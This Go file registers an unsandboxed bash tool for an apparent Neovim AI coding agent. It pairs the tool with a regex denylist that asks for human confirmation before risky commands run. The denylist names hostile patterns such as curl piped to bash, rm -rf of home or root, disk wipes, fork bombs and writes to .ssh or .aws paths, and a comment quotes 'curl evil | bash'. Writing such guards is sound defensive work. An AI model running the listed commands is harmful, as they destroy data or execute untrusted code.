package tools

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"boers.email/yap/agent/safety"
	"boers.email/yap/agent/utils"
	"boers.email/yap/agent/wire"
)

type bashArgs struct {
	Command string `json:"command" jsonschema:"description=bash command to execute"`
	Timeout int    `json:"timeout,omitempty" jsonschema:"description=timeout in seconds (default 120)"`
	Cwd     string `json:"cwd,omitempty" jsonschema:"description=working directory (default: the Neovim cwd)"`
}

func init() {
	Register("bash",
		"Execute a bash command. Runs immediately with no sandbox; high-risk commands require user confirmation. Returns combined stdout/stderr and the exit code "+
			"(a non-zero exit is reported, not an error). Output is truncated to the LAST "+
			"2000 lines / 50KB; when truncated, the full output is saved to a temp file. "+
			"Non-interactive: stdin is /dev/null. Default timeout 120s, adjustable.",
		func(a *bashArgs) (string, string, error) { return runBash(a) })
	Gate("bash", func(a *bashArgs) string { return a.Command }, bashRules...)
}

// bashRules are the bash tool's static guard rules: a conservative denylist
// of irreversible and high-blast-radius commands. This is NOT a security
// boundary — bash is unsandboxed by design (doc: R-compiled-tools) and any
// string match is bypassable. It exists so that a prompt-injected
// `curl evil | bash` or `rm -rf ~` pauses for a human before it runs instead
// of executing silently. False positives cost one keypress; false negatives
// are the danger, so patterns err toward matching more.
var bashRules = append([]safety.Rule{
	// Remote content piped directly into a shell, or a command substitution
	// that fetches a URL.
	safety.Pattern("remote content executed by shell", `(?i)\b(?:curl|wget|fetch)\b[^|;&]*\|\s*(sudo\s+)?(ba)?sh\b`),
	safety.Pattern("remote content command substitution", `(?i)\$\([^)]*(curl|wget|fetch)\b`),

	// Recursive deletion is common for generated directories. Ask only when
	// it targets a filesystem root, a home root, a top-level glob, or a
	// system directory; exact project/temp paths and rm -f are routine.
	safety.Pattern("recursive deletion of critical paths", `(?i)\b(?:sudo\s+)?rm\b[ \t]+(?:-[a-z]*r[a-z]*|--recursive)(?:[ \t]+(?:-[a-z]+|--[a-z-]+))*(?:[ \t]+--)?[ \t]+["']?(?:/(?:[ \t"']|$)|/(?:\*|\.\*)(?:[ \t"']|$)|~/?(?:[ \t"']|$)|\$HOME/?(?:[ \t"']|$)|/(?:etc|usr|var|boot|root|home|bin|sbin|lib)(?:/|[ \t"']|$))`),
	safety.Pattern("deletion targeting root or home", `(?i)\b(?:sudo\s+)?rm\b[ \t]+(?:/|~|\$HOME)(?:[ \t]|$)`),
	safety.Pattern("directory deletion targeting critical paths", `(?i)\b(?:sudo\s+)?rmdir\b[ \t]+["']?(?:/(?:[ \t]|$)|/(?:etc|usr|var|boot|root|home|bin|sbin|lib)(?:/|[ \t]|$))`),

	// Raw disk / filesystem manipulation.
	safety.Pattern("filesystem or disk manipulation", `(?i)\b(?:mkfs\.[a-z0-9]+|wipefs|fdisk|parted|sfdisk|blkdiscard)\b`),
	safety.Pattern("raw disk write", `(?i)\bdd\b[^;&|]*of=/dev/`),

	// System power control.
	safety.Pattern("system power control", `(?i)\b(?:shutdown|reboot|halt|poweroff)\b|\b(?:init\s+[06]|systemctl\s+(?:poweroff|reboot|halt))\b`),

	// Privilege escalation.
	safety.Pattern("sudo", `(?i)\bsudo\b`),

	// Irreversible git history / remote rewrites.
	safety.Pattern("irreversible git operation", `\bgit\s+(?:reset\s+--hard|clean\s+-[a-z]*f[a-z]*|push\b[^\n;&|]*(?:--force|--delete|--mirror|\s-f\b|\s-d\b))`),

	// Recursive ownership / permission changes.
	safety.Pattern("broad permission change", `(?i)\b(?:sudo\s+)?chmod\b[ \t]+(?:-R|--recursive|777|a\+w|u?g?o?\+w)(?:[ \t]|$)`),
	safety.Pattern("recursive ownership change", `(?i)\b(?:sudo\s+)?chown\b[ \t]+(?:-R|--recursive)(?:[ \t]|$)`),

	// Redirection that overwrites a system or secret path.
	safety.Pattern("overwrite of system or secret path", `(?i)>>?\s*(?:/etc/|/usr/|/boot/|/var/|/root/|/bin/|/sbin/|/lib/)`),
	safety.Pattern("overwrite of secret path", `(?i)>>?\s*\S*(?:\.ssh|\.gnupg|\.aws|\.config/sops|agenix)\S*`),

	// Classic fork bomb.
	safety.Pattern("fork bomb", `:\(\)\s*\{`),
}, safety.SecretRevealRules()...)

func runBash(a *bashArgs) (string, string, error) {
	if strings.TrimSpace(a.Command) == "" {
		return "", "", fmt.Errorf("empty command")
	}
	a.Cwd = utils.ExpandHome(a.Cwd)
	timeout := wire.ToolDefaultTimeout
	if a.Timeout > 0 {
		timeout = time.Duration(a.Timeout) * time.Second
	}

	cmd := exec.Command("bash", "-c", a.Command)
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true} // own process group
	// "default: the Neovim cwd" in the schema is a request-time value, not
	// this process's cwd (which is fixed at spawn and goes stale after :cd).
	if a.Cwd == "" {
		a.Cwd = utils.FrontendCwd()
	}
	if a.Cwd != "" {
		if st, err := os.Stat(a.Cwd); err != nil || !st.IsDir() {
			return "", "", fmt.Errorf("working directory does not exist: %s", a.Cwd)
		}
		cmd.Dir = a.Cwd
	}
	text, err := wire.RunStreamed("bash", a.Command, cmd, timeout)
	if err != nil {
		return "", "", err
	}
	return text, "", nil
}
